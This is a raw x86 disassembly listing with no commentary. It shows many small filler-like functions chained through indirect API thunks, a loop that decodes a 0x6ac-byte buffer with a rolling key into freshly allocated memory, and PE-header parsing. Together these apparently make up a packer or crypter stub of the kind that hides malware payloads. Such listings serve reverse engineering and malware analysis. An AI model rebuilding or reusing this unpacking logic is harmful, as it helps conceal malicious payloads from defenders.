  4d0791:	sub    esp,0x28
  4d0794:	mov    ecx,0x4d304c
  4d0799:	sbb    eax,DWORD PTR [ecx+0x170]
  4d079f:	push   ecx
  4d07a0:	mov    edi,0x0
  4d07a5:	push   edi
  4d07a6:	call   0x4d0b28
  4d07ab:	add    esp,0x4
  4d07ae:	pop    ecx
  4d07af:	push   ecx
  4d07b0:	push   edi
  4d07b1:	push   DWORD PTR [ecx+0xa8]
  4d07b7:	push   ebx
  4d07b8:	push   DWORD PTR [ecx+0x88]
  4d07be:	call   0x4d0748
  4d07c3:	add    esp,0x10
  4d07c6:	pop    ecx
  4d07c7:	push   ecx
  4d07c8:	push   0x0
  4d07ca:	call   0x4d156c
  4d07cf:	add    esp,0x4
  4d07d2:	pop    ecx
  4d07d3:	add    esp,0x28
  4d07d6:	pop    ebp
  4d07d7:	ret    
  4d07d8:	mov    edi,edi
  4d07da:	push   ebp
  4d07db:	mov    ebp,esp
  4d07dd:	sub    esp,0x50
  4d07e0:	mov    edx,0x4d31e8
  4d07e5:	sbb    eax,esi
  4d07e7:	push   edx
  4d07e8:	mov    edx,0x0
  4d07ed:	push   edx
  4d07ee:	call   0x4d0e38
  4d07f3:	add    esp,0x4
  4d07f6:	pop    edx
  4d07f7:	push   edx
  4d07f8:	push   esi
  4d07f9:	push   edi
  4d07fa:	push   DWORD PTR [edx+0xac]
  4d0800:	call   0x4d1118
  4d0805:	add    esp,0xc
  4d0808:	pop    edx
  4d0809:	push   edx
  4d080a:	mov    edx,0x0
  4d080f:	push   edx
  4d0810:	call   0x4d0a0c
  4d0815:	add    esp,0x4
  4d0818:	pop    edx
  4d0819:	add    esp,0x50
  4d081c:	pop    ebp
  4d081d:	ret    
  4d081e:	add    BYTE PTR [eax],al
  4d0820:	mov    edi,edi
  4d0822:	push   ebp
  4d0823:	mov    ebp,esp
  4d0825:	sub    esp,0x54
  4d0828:	lea    esi,ds:0x4d30b0
  4d082e:	or     DWORD PTR [esi+0xd8],eax
  4d0834:	push   esi
  4d0835:	push   ecx
  4d0836:	push   DWORD PTR [esi+0x170]
  4d083c:	call   0x4d0ed0
  4d0841:	add    esp,0x8
  4d0844:	pop    esi
  4d0845:	push   0x0
  4d0847:	call   0x4d0b28
  4d084c:	add    esp,0x4
  4d084f:	mov    ebx,0x4d2014
  4d0854:	mov    ebx,DWORD PTR [ebx]
  4d0856:	push   ebx
  4d0857:	push   DWORD PTR [esi+0x110]
  4d085d:	pop    eax
  4d085e:	call   eax
  4d0860:	add    esp,0x54
  4d0863:	pop    ebp
  4d0864:	ret    
  4d0865:	add    BYTE PTR [eax],al
  4d0867:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d086d:	sub    esp,0x38
  4d0870:	mov    edx,0x4d3174
  4d0875:	add    DWORD PTR [edx-0x3c],edi
  4d0878:	push   edx
  4d0879:	push   DWORD PTR [edx+0x108]
  4d087f:	push   esi
  4d0880:	push   eax
  4d0881:	call   0x4d1454
  4d0886:	add    esp,0xc
  4d0889:	pop    edx
  4d088a:	push   edx
  4d088b:	mov    esi,0x0
  4d0890:	push   esi
  4d0891:	call   0x4d0b1c
  4d0896:	add    esp,0x4
  4d0899:	pop    edx
  4d089a:	push   edx
  4d089b:	mov    eax,0x0
  4d08a0:	push   eax
  4d08a1:	call   0x4d0b28
  4d08a6:	add    esp,0x4
  4d08a9:	pop    edx
  4d08aa:	add    esp,0x38
  4d08ad:	pop    ebp
  4d08ae:	ret    
  4d08af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08b5:	sub    esp,0x34
  4d08b8:	mov    eax,0x4d316c
  4d08bd:	and    ebx,esi
  4d08bf:	push   eax
  4d08c0:	push   0x0
  4d08c2:	call   0x4d0a60
  4d08c7:	add    esp,0x4
  4d08ca:	pop    eax
  4d08cb:	push   eax
  4d08cc:	push   ecx
  4d08cd:	push   DWORD PTR [eax+0xa0]
  4d08d3:	push   DWORD PTR [eax+0x2c]
  4d08d6:	call   0x4d0f60
  4d08db:	add    esp,0xc
  4d08de:	pop    eax
  4d08df:	push   eax
  4d08e0:	lea    edx,[eax-0x16c]
  4d08e6:	push   edx
  4d08e7:	call   0x4d10cc
  4d08ec:	add    esp,0x4
  4d08ef:	test   eax,eax
  4d08f1:	jne    0x4d08e0
  4d08f3:	pop    eax
  4d08f4:	add    esp,0x34
  4d08f7:	pop    ebp
  4d08f8:	ret    
  4d08f9:	add    BYTE PTR [eax],al
  4d08fb:	add    BYTE PTR [edi-0x1],bl
  4d08fe:	adc    eax,0x4d2020
  4d0903:	call   edi
  4d0905:	add    BYTE PTR [eax],al
  4d0907:	add    BYTE PTR [edi-0x1],bl
  4d090a:	adc    eax,0x4d2028
  4d090f:	call   edi
  4d0911:	add    BYTE PTR [eax],al
  4d0913:	add    BYTE PTR [edi-0x1],bl
  4d0916:	adc    eax,0x4d2034
  4d091b:	call   edi
  4d091d:	add    BYTE PTR [eax],al
  4d091f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0925:	sub    esp,0x34
  4d0928:	and    DWORD PTR [ebp-0x24],0xd
  4d092c:	lea    edx,[eax+0x3c]
  4d092f:	push   edx
  4d0930:	mov    ebx,0x6ac
  4d0935:	push   ebx
  4d0936:	mov    esi,0x6ac
  4d093b:	push   esi
  4d093c:	push   0x40001
  4d0941:	mov    edi,0x8629858a
  4d0946:	push   DWORD PTR [edi+0x7a239a86]
  4d094c:	sub    DWORD PTR [esp],0x2
  4d0950:	mov    edi,0x4d2004
  4d0955:	pop    DWORD PTR [edi]
  4d0957:	call   0x4d0c70
  4d095c:	add    esp,0x4
  4d095f:	xchg   DWORD PTR [esp],eax
  4d0962:	mov    edx,eax
  4d0964:	pop    DWORD PTR [edx+0x104]
  4d096a:	mov    esi,DWORD PTR [edx+0x104]
  4d0970:	mov    esi,esi
  4d0972:	sub    ebx,ebx
  4d0974:	dec    ebx
  4d0975:	and    ebx,0x4d0014
  4d097b:	mov    ecx,0x7ec7f445
  4d0980:	xor    eax,eax
  4d0982:	cmp    eax,0x6ac
  4d0987:	je     0x4d09a5
  4d0989:	sub    eax,0xfffffffc
  4d098c:	xor    edi,edi
  4d098e:	push   DWORD PTR [ebx+edi*1]
  4d0991:	add    DWORD PTR [esp],ecx
  4d0994:	pop    DWORD PTR [esi+edi*2]
  4d0997:	dec    DWORD PTR [esi]
  4d0999:	xor    ecx,ecx
  4d099b:	add    ecx,DWORD PTR [ebx]
  4d099d:	add    ebx,0x4
  4d09a0:	add    esi,0x4
  4d09a3:	jmp    0x4d0982
  4d09a5:	push   edx
  4d09a6:	push   0x0
  4d09a8:	call   0x4d08fc
  4d09ad:	add    esp,0x4
  4d09b0:	pop    edx
  4d09b1:	add    esp,0x34
  4d09b4:	pop    ebp
  4d09b5:	ret    
  4d09b6:	add    BYTE PTR [eax],al
  4d09b8:	pop    edi
  4d09b9:	call   DWORD PTR ds:0x4d2018
  4d09bf:	call   edi
  4d09c1:	add    BYTE PTR [eax],al
  4d09c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09c9:	sub    esp,0x50
  4d09cc:	lea    edi,[ecx-0x3c]
  4d09cf:	cmp    edi,0x5383
  4d09d5:	jbe    0x4d09c7
  4d09d7:	push   edi
  4d09d8:	push   DWORD PTR [edi+0x88]
  4d09de:	push   DWORD PTR [edi+0x10c]
  4d09e4:	push   ebx
  4d09e5:	push   edx
  4d09e6:	call   0x4d10d8
  4d09eb:	add    esp,0x10
  4d09ee:	pop    edi
  4d09ef:	push   edi
  4d09f0:	push   0x0
  4d09f2:	call   0x4d0d48
  4d09f7:	add    esp,0x4
  4d09fa:	pop    edi
  4d09fb:	push   edi
  4d09fc:	push   0x0
  4d09fe:	call   0x4d156c
  4d0a03:	add    esp,0x4
  4d0a06:	pop    edi
  4d0a07:	add    esp,0x50
  4d0a0a:	pop    ebp
  4d0a0b:	ret    
  4d0a0c:	pop    edi
  4d0a0d:	call   DWORD PTR ds:0x4d207c
  4d0a13:	call   edi
  4d0a15:	add    BYTE PTR [eax],al
  4d0a17:	add    BYTE PTR [edi-0x1],bl
  4d0a1a:	adc    eax,0x4d208c
  4d0a1f:	call   edi
  4d0a21:	add    BYTE PTR [eax],al
  4d0a23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a29:	sub    esp,0x50
  4d0a2c:	mov    ebx,0x4d30ec
  4d0a31:	xor    eax,ebx
  4d0a33:	push   ebx
  4d0a34:	push   esi
  4d0a35:	push   eax
  4d0a36:	push   edi
  4d0a37:	push   DWORD PTR [ebx+0x13c]
  4d0a3d:	call   0x4d1578
  4d0a42:	add    esp,0x10
  4d0a45:	pop    ebx
  4d0a46:	push   0x0
  4d0a48:	call   0x4d0b1c
  4d0a4d:	add    esp,0x4
  4d0a50:	push   0x0
  4d0a52:	call   0x4d156c
  4d0a57:	add    esp,0x4
  4d0a5a:	add    esp,0x50
  4d0a5d:	pop    ebp
  4d0a5e:	ret    
  4d0a5f:	add    BYTE PTR [edi-0x1],bl
  4d0a62:	adc    eax,0x4d202c
  4d0a67:	call   edi
  4d0a69:	add    BYTE PTR [eax],al
  4d0a6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a71:	sub    esp,0x60
  4d0a74:	lea    eax,[edx+0x174]
  4d0a7a:	adc    DWORD PTR [ebp-0x3c],ecx
  4d0a7d:	push   eax
  4d0a7e:	push   DWORD PTR [eax+0x110]
  4d0a84:	push   esi
  4d0a85:	call   0x4d100c
  4d0a8a:	add    esp,0x8
  4d0a8d:	pop    eax
  4d0a8e:	push   eax
  4d0a8f:	push   0x0
  4d0a91:	call   0x4d0b1c
  4d0a96:	add    esp,0x4
  4d0a99:	pop    eax
  4d0a9a:	push   eax
  4d0a9b:	mov    esi,0x0
  4d0aa0:	push   esi
  4d0aa1:	call   0x4d0b28
  4d0aa6:	add    esp,0x4
  4d0aa9:	pop    eax
  4d0aaa:	add    esp,0x60
  4d0aad:	pop    ebp
  4d0aae:	ret    
  4d0aaf:	add    BYTE PTR [edi-0x1],bl
  4d0ab2:	adc    eax,0x4d20a0
  4d0ab7:	call   edi
  4d0ab9:	add    BYTE PTR [eax],al
  4d0abb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ac1:	sub    esp,0x28
  4d0ac4:	lea    edx,ds:0x4d31e4
  4d0aca:	mov    ecx,DWORD PTR [ebp-0x24]
  4d0acd:	push   edx
  4d0ace:	push   DWORD PTR [edx+0x120]
  4d0ad4:	push   DWORD PTR [edx+0x6c]
  4d0ad7:	push   DWORD PTR [edx+0x70]
  4d0ada:	call   0x4d08b0
  4d0adf:	add    esp,0xc
  4d0ae2:	pop    edx
  4d0ae3:	push   edx
  4d0ae4:	lea    ebx,[edx-0x1e4]
  4d0aea:	push   ebx
  4d0aeb:	call   0x4d10cc
  4d0af0:	add    esp,0x4
  4d0af3:	test   eax,eax
  4d0af5:	jne    0x4d0ae4
  4d0af7:	pop    edx
  4d0af8:	push   edx
  4d0af9:	mov    ebx,0x0
  4d0afe:	push   ebx
  4d0aff:	call   0x4d0a60
  4d0b04:	add    esp,0x4
  4d0b07:	pop    edx
  4d0b08:	add    esp,0x28
  4d0b0b:	pop    ebp
  4d0b0c:	ret    
  4d0b0d:	add    BYTE PTR [eax],al
  4d0b0f:	add    BYTE PTR [edi-0x1],bl
  4d0b12:	adc    eax,0x4d2030
  4d0b17:	call   edi
  4d0b19:	add    BYTE PTR [eax],al
  4d0b1b:	add    BYTE PTR [edi-0x1],bl
  4d0b1e:	adc    eax,0x4d2068
  4d0b23:	call   edi
  4d0b25:	add    BYTE PTR [eax],al
  4d0b27:	add    BYTE PTR [edi-0x1],bl
  4d0b2a:	adc    eax,0x4d2008
  4d0b2f:	call   edi
  4d0b31:	add    BYTE PTR [eax],al
  4d0b33:	add    BYTE PTR [edi-0x1],bl
  4d0b36:	adc    eax,0x4d2088
  4d0b3b:	call   edi
  4d0b3d:	add    BYTE PTR [eax],al
  4d0b3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b45:	sub    esp,0x34
  4d0b48:	lea    edi,ds:0x4d3020
  4d0b4e:	add    ecx,0xfffff927
  4d0b54:	push   edi
  4d0b55:	push   DWORD PTR [edi+0x128]
  4d0b5b:	push   ebx
  4d0b5c:	call   0x4d14e0
  4d0b61:	add    esp,0x8
  4d0b64:	pop    edi
  4d0b65:	push   edi
  4d0b66:	push   0x0
  4d0b68:	call   0x4d0ce0
  4d0b6d:	add    esp,0x4
  4d0b70:	pop    edi
  4d0b71:	push   edi
  4d0b72:	push   0xfffffff4
  4d0b74:	call   0x4d09b8
  4d0b79:	add    esp,0x4
  4d0b7c:	pop    edi
  4d0b7d:	add    esp,0x34
  4d0b80:	pop    ebp
  4d0b81:	ret    
  4d0b82:	add    BYTE PTR [eax],al
  4d0b84:	mov    edi,edi
  4d0b86:	push   ebp
  4d0b87:	mov    ebp,esp
  4d0b89:	sub    esp,0x3c
  4d0b8c:	mov    edx,0x4d3044
  4d0b91:	or     DWORD PTR [ebp-0x24],eax
  4d0b94:	push   edx
  4d0b95:	push   esi
  4d0b96:	push   DWORD PTR [edx+0xf4]
  4d0b9c:	push   esi
  4d0b9d:	call   0x4d13f0
  4d0ba2:	add    esp,0xc
  4d0ba5:	pop    edx
  4d0ba6:	push   edx
  4d0ba7:	lea    edi,[edx-0x44]
  4d0baa:	push   edi
  4d0bab:	call   0x4d10cc
  4d0bb0:	add    esp,0x4
  4d0bb3:	test   eax,eax
  4d0bb5:	jne    0x4d0ba7
  4d0bb7:	pop    edx
  4d0bb8:	push   edx
  4d0bb9:	push   0x0
  4d0bbb:	call   0x4d106c
  4d0bc0:	add    esp,0x4
  4d0bc3:	pop    edx
  4d0bc4:	add    esp,0x3c
  4d0bc7:	pop    ebp
  4d0bc8:	ret    
  4d0bc9:	add    BYTE PTR [eax],al
  4d0bcb:	add    BYTE PTR [edi-0x1],bl
  4d0bce:	adc    eax,0x4d2070
  4d0bd3:	call   edi
  4d0bd5:	add    BYTE PTR [eax],al
  4d0bd7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bdd:	sub    esp,0x40
  4d0be0:	lea    eax,[ecx+0x9c]
  4d0be6:	or     ecx,DWORD PTR [eax-0x9c]
  4d0bec:	push   eax
  4d0bed:	mov    edx,0x0
  4d0bf2:	push   edx
  4d0bf3:	call   0x4d0a0c
  4d0bf8:	add    esp,0x4
  4d0bfb:	pop    eax
  4d0bfc:	push   eax
  4d0bfd:	push   DWORD PTR [eax+0x88]
  4d0c03:	push   DWORD PTR [eax+0x104]
  4d0c09:	push   edi
  4d0c0a:	call   0x4d06f8
  4d0c0f:	add    esp,0xc
  4d0c12:	pop    eax
  4d0c13:	push   eax
  4d0c14:	mov    edx,0x0
  4d0c19:	push   edx
  4d0c1a:	call   0x4d0ce0
  4d0c1f:	add    esp,0x4
  4d0c22:	pop    eax
  4d0c23:	add    esp,0x40
  4d0c26:	pop    ebp
  4d0c27:	ret    
  4d0c28:	push   edi
  4d0c29:	sub    edi,edi
  4d0c2b:	push   edi
  4d0c2c:	push   edi
  4d0c2d:	push   edi
  4d0c2e:	push   edi
  4d0c2f:	call   0x4d1430
  4d0c34:	sub    esp,0xfffffffc
  4d0c37:	call   0x4d0ec4
  4d0c3c:	push   0x2
  4d0c3e:	xor    eax,eax
  4d0c40:	sub    eax,0x4d3030
  4d0c45:	neg    eax
  4d0c47:	push   0x0
  4d0c49:	lea    ecx,[eax+0x7]
  4d0c4c:	add    BYTE PTR [ecx],0x41
  4d0c4f:	push   eax
  4d0c50:	call   0x4d0c70
  4d0c55:	pop    edi
  4d0c56:	pop    edi
  4d0c57:	pop    edi
  4d0c58:	lea    ecx,[eax+0x3b]
  4d0c5b:	mov    edi,DWORD PTR [ecx]
  4d0c5d:	lea    eax,[eax+edi*1]
  4d0c60:	mov    eax,DWORD PTR [eax+0x28]
  4d0c63:	pusha  
  4d0c64:	mov    ah,0x45
  4d0c66:	sub    al,ah
  4d0c68:	ja     0x4d0820
  4d0c6e:	popa   
  4d0c6f:	ret    
  4d0c70:	pop    edi
  4d0c71:	call   DWORD PTR ds:0x4d2004
  4d0c77:	call   edi
  4d0c79:	add    BYTE PTR [eax],al
  4d0c7b:	add    BYTE PTR [edi-0x1],bl
  4d0c7e:	adc    eax,0x4d201c
  4d0c83:	call   edi
  4d0c85:	add    BYTE PTR [eax],al
  4d0c87:	add    BYTE PTR [edi-0x1],bl
  4d0c8a:	adc    eax,0x4d2058
  4d0c8f:	call   edi
  4d0c91:	add    BYTE PTR [eax],al
  4d0c93:	add    BYTE PTR [edi-0x1],bl
  4d0c96:	adc    eax,0x4d2044
  4d0c9b:	call   edi
  4d0c9d:	add    BYTE PTR [eax],al
  4d0c9f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ca5:	sub    esp,0x34
  4d0ca8:	mov    ebx,0x4d313c
  4d0cad:	adc    eax,edi
  4d0caf:	push   0x0
  4d0cb1:	call   0x4d0e38
  4d0cb6:	add    esp,0x4
  4d0cb9:	push   ebx
  4d0cba:	push   DWORD PTR [ebx+0xe0]
  4d0cc0:	push   edx
  4d0cc1:	call   0x4d078c
  4d0cc6:	add    esp,0x8
  4d0cc9:	pop    ebx
  4d0cca:	mov    edx,0x0
  4d0ccf:	push   edx
  4d0cd0:	call   0x4d0a60
  4d0cd5:	add    esp,0x4
  4d0cd8:	add    esp,0x34
  4d0cdb:	pop    ebp
  4d0cdc:	ret    
  4d0cdd:	add    BYTE PTR [eax],al
  4d0cdf:	add    BYTE PTR [edi-0x1],bl
  4d0ce2:	adc    eax,0x4d2054
  4d0ce7:	call   edi
  4d0ce9:	add    BYTE PTR [eax],al
  4d0ceb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cf1:	sub    esp,0x54
  4d0cf4:	lea    edx,ds:0x4d31cc
  4d0cfa:	cmp    edx,0x4f22
  4d0d00:	je     0x4d0cef
  4d0d02:	push   edx
  4d0d03:	push   DWORD PTR [edx+0x8]
  4d0d06:	push   ebx
  4d0d07:	push   ebx
  4d0d08:	call   0x4d152c
  4d0d0d:	add    esp,0xc
  4d0d10:	pop    edx
  4d0d11:	push   edx
  4d0d12:	mov    eax,0x0
  4d0d17:	push   eax
  4d0d18:	call   0x4d0e38
  4d0d1d:	add    esp,0x4
  4d0d20:	pop    edx
  4d0d21:	push   edx
  4d0d22:	lea    esi,[edx-0x1cc]
  4d0d28:	push   esi
  4d0d29:	call   0x4d10cc
  4d0d2e:	add    esp,0x4
  4d0d31:	test   eax,eax
  4d0d33:	jne    0x4d0d22
  4d0d35:	pop    edx
  4d0d36:	add    esp,0x54
  4d0d39:	pop    ebp
  4d0d3a:	ret    
  4d0d3b:	add    BYTE PTR [edi-0x1],bl
  4d0d3e:	adc    eax,0x4d2060
  4d0d43:	call   edi
  4d0d45:	add    BYTE PTR [eax],al
  4d0d47:	add    BYTE PTR [edi-0x1],bl
  4d0d4a:	adc    eax,0x4d200c
  4d0d4f:	call   edi
  4d0d51:	add    BYTE PTR [eax],al
  4d0d53:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d59:	sub    esp,0x34
  4d0d5c:	lea    ebx,ds:0x4d300c
  4d0d62:	cmp    ebx,0x7193
  4d0d68:	je     0x4d0d57
  4d0d6a:	push   0x0
  4d0d6c:	call   0x4d0b1c
  4d0d71:	add    esp,0x4
  4d0d74:	push   ebx
  4d0d75:	push   DWORD PTR [ebx+0x1ac]
  4d0d7b:	push   DWORD PTR [ebx+0x110]
  4d0d81:	push   DWORD PTR [ebx+0x120]
  4d0d87:	push   DWORD PTR [ebx+0x8]
  4d0d8a:	call   0x4d0e88
  4d0d8f:	add    esp,0x10
  4d0d92:	pop    ebx
  4d0d93:	call   0x4d0c94
  4d0d98:	add    esp,0x4
  4d0d9b:	add    esp,0x34
  4d0d9e:	pop    ebp
  4d0d9f:	ret    
  4d0da0:	pop    edi
  4d0da1:	call   DWORD PTR ds:0x4d2078
  4d0da7:	call   edi
  4d0da9:	add    BYTE PTR [eax],al
  4d0dab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db1:	sub    esp,0x3c
  4d0db4:	mov    ecx,0x4d30dc
  4d0db9:	mov    DWORD PTR [ecx+0x40],0x73f5
  4d0dc0:	push   ecx
  4d0dc1:	push   ebx
  4d0dc2:	push   DWORD PTR [ecx+0x108]
  4d0dc8:	call   0x4d0bd8
  4d0dcd:	add    esp,0x8
  4d0dd0:	pop    ecx
  4d0dd1:	push   ecx
  4d0dd2:	push   0x0
  4d0dd4:	call   0x4d106c
  4d0dd9:	add    esp,0x4
  4d0ddc:	pop    ecx
  4d0ddd:	push   ecx
  4d0dde:	mov    ebx,0x0
  4d0de3:	push   ebx
  4d0de4:	call   0x4d156c
  4d0de9:	add    esp,0x4
  4d0dec:	pop    ecx
  4d0ded:	add    esp,0x3c
  4d0df0:	pop    ebp
  4d0df1:	ret    
  4d0df2:	add    BYTE PTR [eax],al
  4d0df4:	mov    edi,edi
  4d0df6:	push   ebp
  4d0df7:	mov    ebp,esp
  4d0df9:	sub    esp,0x24
  4d0dfc:	lea    ecx,[eax+0x9c]
  4d0e02:	cmp    ecx,0x5cf0
  4d0e08:	je     0x4d0df7
  4d0e0a:	push   ecx
  4d0e0b:	push   ebx
  4d0e0c:	push   eax
  4d0e0d:	call   0x4d09c4
  4d0e12:	add    esp,0x8
  4d0e15:	pop    ecx
  4d0e16:	push   ecx
  4d0e17:	mov    eax,0x0
  4d0e1c:	push   eax
  4d0e1d:	call   0x4d08fc
  4d0e22:	add    esp,0x4
  4d0e25:	pop    ecx
  4d0e26:	push   ecx
  4d0e27:	call   0x4d0c7c
  4d0e2c:	add    esp,0x4
  4d0e2f:	pop    ecx
  4d0e30:	add    esp,0x24
  4d0e33:	pop    ebp
  4d0e34:	ret    
  4d0e35:	add    BYTE PTR [eax],al
  4d0e37:	add    BYTE PTR [edi-0x1],bl
  4d0e3a:	adc    eax,0x4d2024
  4d0e3f:	call   edi
  4d0e41:	add    BYTE PTR [eax],al
  4d0e43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e49:	sub    esp,0x20
  4d0e4c:	lea    eax,[ecx+0x30]
  4d0e4f:	sub    edx,ebx
  4d0e51:	push   eax
  4d0e52:	push   DWORD PTR [eax+0x130]
  4d0e58:	push   ebx
  4d0e59:	call   0x4d0fc0
  4d0e5e:	add    esp,0x8
  4d0e61:	pop    eax
  4d0e62:	push   eax
  4d0e63:	mov    eax,0x0
  4d0e68:	push   eax
  4d0e69:	call   0x4d08fc
  4d0e6e:	add    esp,0x4
  4d0e71:	pop    eax
  4d0e72:	push   eax
  4d0e73:	mov    edi,0x0
  4d0e78:	push   edi
  4d0e79:	call   0x4d0e38
  4d0e7e:	add    esp,0x4
  4d0e81:	pop    eax
  4d0e82:	add    esp,0x20
  4d0e85:	pop    ebp
  4d0e86:	ret    
  4d0e87:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e8d:	sub    esp,0x2c
  4d0e90:	mov    ecx,0x4d3054
  4d0e95:	or     esi,DWORD PTR [ebp-0x10]
  4d0e98:	push   ecx
  4d0e99:	push   DWORD PTR [ecx+0x48]
  4d0e9c:	push   DWORD PTR [ecx+0x40]
  4d0e9f:	call   0x4d0e44
  4d0ea4:	add    esp,0x8
  4d0ea7:	pop    ecx
  4d0ea8:	push   ecx
  4d0ea9:	push   0x0
  4d0eab:	call   0x4d0a0c
  4d0eb0:	add    esp,0x4
  4d0eb3:	pop    ecx
  4d0eb4:	push   ecx
  4d0eb5:	call   0x4d0c94
  4d0eba:	add    esp,0x4
  4d0ebd:	pop    ecx
  4d0ebe:	add    esp,0x2c
  4d0ec1:	pop    ebp
  4d0ec2:	ret    
  4d0ec3:	add    BYTE PTR [edi-0x1],bl
  4d0ec6:	adc    eax,0x4d2038
  4d0ecb:	call   edi
  4d0ecd:	add    BYTE PTR [eax],al
  4d0ecf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ed5:	sub    esp,0x58
  4d0ed8:	lea    ecx,[esi+0x108]
  4d0ede:	add    DWORD PTR [ebp-0x1c],ebx
  4d0ee1:	push   ecx
  4d0ee2:	push   DWORD PTR [ecx+0x1e4]
  4d0ee8:	push   DWORD PTR [ecx+0x1e0]
  4d0eee:	push   DWORD PTR [ecx+0x198]
  4d0ef4:	push   eax
  4d0ef5:	call   0x4d0abc
  4d0efa:	add    esp,0x10
  4d0efd:	pop    ecx
  4d0efe:	push   ecx
  4d0eff:	mov    eax,0x0
  4d0f04:	push   eax
  4d0f05:	call   0x4d156c
  4d0f0a:	add    esp,0x4
  4d0f0d:	pop    ecx
  4d0f0e:	push   ecx
  4d0f0f:	call   0x4d1430
  4d0f14:	add    esp,0x4
  4d0f17:	pop    ecx
  4d0f18:	add    esp,0x58
  4d0f1b:	pop    ebp
  4d0f1c:	ret    
  4d0f1d:	add    BYTE PTR [eax],al
  4d0f1f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f25:	sub    esp,0x30
  4d0f28:	lea    esi,ds:0x4d303c
  4d0f2e:	adc    eax,DWORD PTR [ebp-0x1c]
  4d0f31:	push   esi
  4d0f32:	push   DWORD PTR [esi+0x1c]
  4d0f35:	push   DWORD PTR [esi+0x68]
  4d0f38:	call   0x4d0a24
  4d0f3d:	add    esp,0x8
  4d0f40:	pop    esi
  4d0f41:	call   0x4d0c94
  4d0f46:	add    esp,0x4
  4d0f49:	lea    ecx,[esi-0x3c]
  4d0f4c:	push   ecx
  4d0f4d:	call   0x4d10cc
  4d0f52:	add    esp,0x4
  4d0f55:	test   eax,eax
  4d0f57:	jne    0x4d0f4a
  4d0f59:	add    esp,0x30
  4d0f5c:	pop    ebp
  4d0f5d:	ret    
  4d0f5e:	add    BYTE PTR [eax],al
  4d0f60:	mov    edi,edi
  4d0f62:	push   ebp
  4d0f63:	mov    ebp,esp
  4d0f65:	sub    esp,0x44
  4d0f68:	lea    esi,[eax+0x64]
  4d0f6b:	cmp    esi,0x68f
  4d0f71:	je     0x4d0f63
  4d0f73:	push   esi
  4d0f74:	push   DWORD PTR [esi+0x3c]
  4d0f77:	push   eax
  4d0f78:	push   edi
  4d0f79:	push   DWORD PTR [esi]
  4d0f7b:	call   0x4d0d54
  4d0f80:	add    esp,0x10
  4d0f83:	pop    esi
  4d0f84:	mov    edi,0x0
  4d0f89:	push   edi
  4d0f8a:	call   0x4d0a60
  4d0f8f:	add    esp,0x4
  4d0f92:	mov    edx,0x0
  4d0f97:	push   edx
  4d0f98:	call   0x4d0ce0
  4d0f9d:	add    esp,0x4
  4d0fa0:	add    esp,0x44
  4d0fa3:	pop    ebp
  4d0fa4:	ret    
  4d0fa5:	add    BYTE PTR [eax],al
  4d0fa7:	add    BYTE PTR [edi-0x1],bl
  4d0faa:	adc    eax,0x4d2080
  4d0faf:	call   edi
  4d0fb1:	add    BYTE PTR [eax],al
  4d0fb3:	add    BYTE PTR [edi-0x1],bl
  4d0fb6:	adc    eax,0x4d2084
  4d0fbb:	call   edi
  4d0fbd:	add    BYTE PTR [eax],al
  4d0fbf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fc5:	sub    esp,0x5c
  4d0fc8:	lea    ecx,ds:0x4d3194
  4d0fce:	mov    edx,0x194e
  4d0fd3:	push   ecx
  4d0fd4:	push   0x0
  4d0fd6:	call   0x4d0d48
  4d0fdb:	add    esp,0x4
  4d0fde:	pop    ecx
  4d0fdf:	push   ecx
  4d0fe0:	push   DWORD PTR [ecx+0x190]
  4d0fe6:	push   DWORD PTR [ecx+0x120]
  4d0fec:	push   DWORD PTR [ecx]
  4d0fee:	call   0x4d0f20
  4d0ff3:	add    esp,0xc
  4d0ff6:	pop    ecx
  4d0ff7:	push   ecx
  4d0ff8:	mov    ecx,0x0
  4d0ffd:	push   ecx
  4d0ffe:	call   0x4d0e38
  4d1003:	add    esp,0x4
  4d1006:	pop    ecx
  4d1007:	add    esp,0x5c
  4d100a:	pop    ebp
  4d100b:	ret    
  4d100c:	mov    edi,edi
  4d100e:	push   ebp
  4d100f:	mov    ebp,esp
  4d1011:	sub    esp,0x5c
  4d1014:	lea    edx,[eax-0x4c]
  4d1017:	sbb    ecx,DWORD PTR [edx-0x124]
  4d101d:	push   edx
  4d101e:	mov    esi,0x0
  4d1023:	push   esi
  4d1024:	call   0x4d0ce0
  4d1029:	add    esp,0x4
  4d102c:	pop    edx
  4d102d:	push   edx
  4d102e:	push   DWORD PTR [edx+0x4]
  4d1031:	push   DWORD PTR [edx+0x2c]
  4d1034:	push   DWORD PTR [edx+0xe4]
  4d103a:	call   0x4d1164
  4d103f:	add    esp,0xc
  4d1042:	pop    edx
  4d1043:	push   edx
  4d1044:	push   0x0
  4d1046:	call   0x4d0a60
  4d104b:	add    esp,0x4
  4d104e:	pop    edx
  4d104f:	add    esp,0x5c
  4d1052:	pop    ebp
  4d1053:	ret    
  4d1054:	pop    edi
  4d1055:	call   DWORD PTR ds:0x4d2090
  4d105b:	call   edi
  4d105d:	add    BYTE PTR [eax],al
  4d105f:	add    BYTE PTR [edi-0x1],bl
  4d1062:	adc    eax,0x4d2064
  4d1067:	call   edi
  4d1069:	add    BYTE PTR [eax],al
  4d106b:	add    BYTE PTR [edi-0x1],bl
  4d106e:	adc    eax,0x4d2048
  4d1073:	call   edi
  4d1075:	add    BYTE PTR [eax],al
  4d1077:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d107d:	sub    esp,0x3c
  4d1080:	lea    edx,ds:0x4d3074
  4d1086:	add    DWORD PTR [ebp-0x1c],eax
  4d1089:	push   edx
  4d108a:	push   0x0
  4d108c:	call   0x4d0ce0
  4d1091:	add    esp,0x4
  4d1094:	pop    edx
